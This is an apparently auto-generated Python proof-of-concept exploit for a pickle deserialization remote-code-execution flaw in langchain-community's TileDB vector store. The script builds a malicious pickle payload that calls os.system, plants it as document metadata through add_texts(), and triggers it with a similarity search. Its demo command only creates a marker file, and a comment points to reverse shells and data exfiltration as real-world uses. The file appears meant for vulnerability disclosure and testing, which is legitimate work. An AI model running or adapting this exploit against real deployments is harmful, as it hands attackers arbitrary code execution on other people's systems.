#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-025
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only TileDB pickle RCE

Vulnerability: Unsafe pickle.loads() in process_index_results() of tiledb.py
CVE: N/A (0-day)
Impact: Remote Code Execution via malicious metadata stored in TileDB array

Attack Flow:
1. Attacker calls add_texts() with a malicious pickle payload as metadata
2. The payload is stored as pickled bytes in the TileDB array
3. When any search operation retrieves that document, process_index_results()
   calls pickle.loads() on the stored metadata, executing the payload

This PoC demonstrates the attack by:
- Creating a malicious pickle payload that creates a marker file
- Storing it via add_texts()
- Triggering retrieval via similarity_search_with_relevance_scores()
"""

import pickle
import os
import sys
import tempfile
import subprocess
from typing import List, Optional, Dict, Any

# Safe payload: creates a marker file to prove code execution
# In a real attack, this could be a reverse shell or data exfiltration
class Exploit:
    def __reduce__(self):
        # Create a marker file in /tmp to prove RCE
        return (os.system, ('touch /tmp/poc_exploited.txt',))

def create_malicious_payload() -> bytes:
    """Create a pickle payload that executes a benign command"""
    return pickle.dumps(Exploit())

def exploit_tiledb_rce(target_url: str = "http://localhost:8000") -> None:
    """
    Exploit the TileDB pickle deserialization vulnerability
    
    Args:
        target_url: Base URL of the vulnerable application
    """
    print(f"[*] Targeting {target_url}")
    print("[*] Step 1: Creating malicious pickle payload...")
    
    malicious_metadata = create_malicious_payload()
    print(f"[+] Malicious payload created ({len(malicious_metadata)} bytes)")
    
    # The actual exploit would need to:
    # 1. Call add_texts() with the malicious metadata
    # 2. Call similarity_search_with_relevance_scores() to trigger deserialization
    
    # For demonstration, we simulate the attack locally
    print("\n[*] Step 2: Simulating the attack locally...")
    
    # Create a temporary directory for the TileDB array
    temp_dir = tempfile.mkdtemp()
    print(f"[*] Using temporary directory: {temp_dir}")
    
    try:
        # Import the vulnerable module
        from langchain_community.vectorstores.tiledb import TileDB
        
        # Create a mock embedding function
        class MockEmbeddings:
            def embed_documents(self, texts: List[str]) -> List[List[float]]:
                return [[0.1, 0.2, 0.3] for _ in texts]
            
            def embed_query(self, text: str) -> List[float]:
                return [0.1, 0.2, 0.3]
        
        embeddings = MockEmbeddings()
        
        print("[*] Step 3: Creating TileDB vector store...")
        vector_store = TileDB(
            embedding_function=embeddings,
            docs_array_uri=os.path.join(temp_dir, "docs"),
            index_array_uri=os.path.join(temp_dir, "index"),
        )
        
        print("[*] Step 4: Storing malicious document via add_texts()...")
        # The metadata is the pickle payload - this is the injection point
        vector_store.add_texts(
            texts=["This is a benign document"],
            metadatas=[{"payload": malicious_metadata}],
        )
        print("[+] Malicious document stored successfully")
        
        print("[*] Step 5: Triggering deserialization via search...")
        # This will call process_index_results() which calls pickle.loads()
        # on the stored metadata, executing our payload
        try:
            results = vector_store.similarity_search_with_relevance_scores(
                query="test query",
                k=1,
            )
            print(f"[+] Search completed, got {len(results)} results")
        except Exception as e:
            print(f"[!] Search raised exception (expected): {e}")
        
        # Check if the marker file was created
        marker_file = "/tmp/poc_exploited.txt"
        if os.path.exists(marker_file):
            print(f"\n[+] SUCCESS: Marker file {marker_file} was created!")
            print("[+] This proves arbitrary code execution was achieved")
            os.remove(marker_file)
        else:
            print("\n[-] Marker file not found - exploit may have failed")
            print("[*] Check the application logs for details")
            
    except ImportError as e:
        print(f"[-] Import error: {e}")
        print("[*] Make sure langchain-community is installed")
        print("[*] Try: pip install langchain-community")
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)
        print(f"\n[*] Cleaned up temporary directory: {temp_dir}")

def main():
    """Main entry point with argument parsing"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC for TileDB pickle deserialization RCE in langchain-community"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--local",
        action="store_true",
        default=True,
        help="Run local simulation (default: True)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("TileDB Pickle Deserialization RCE - Proof of Concept")
    print("=" * 60)
    print()
    
    if args.local:
        exploit_tiledb_rce(args.target)
    else:
        print("[*] Remote exploitation requires a running instance")
        print("[*] Use --local for local simulation")
        sys.exit(1)

if __name__ == "__main__":
    main()
